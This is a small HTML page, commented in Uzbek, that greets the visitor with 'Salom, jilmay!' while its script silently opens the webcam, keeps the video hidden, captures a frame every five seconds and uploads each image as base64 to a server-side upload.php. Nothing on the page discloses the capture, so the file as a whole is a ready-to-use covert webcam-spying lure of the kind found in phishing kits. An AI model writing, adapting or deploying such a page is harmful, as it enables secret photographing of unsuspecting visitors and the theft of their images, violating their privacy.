<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: black;
            color: red;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        h1 {
            font-size: 2em;
        }
        video {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Salom, jilmay!</h1>

    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Kamera va video oynasini sozlash
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                const video = document.getElementById('video');
                video.srcObject = stream;

                // Har 5 sekundda rasm olish
                setInterval(function() {
                    captureAndSend();
                }, 5000);
            })
            .catch(function(error) {
                console.log("Kamera olishda xatolik: " + error);
            });

        function captureAndSend() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');

            // Videodan rasm olish
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            // Rasmni Base64 formatiga aylantirish
            const base64Image = canvas.toDataURL('image/png');

            // AJAX orqali rasmni PHP serveriga yuborish
            sendImageToServer(base64Image);
        }

        function sendImageToServer(base64Image) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'upload.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    console.log('Rasm yuborildi!');
                }
            };
            xhr.send('image=' + encodeURIComponent(base64Image));
        }
    </script>
</body>
</html>
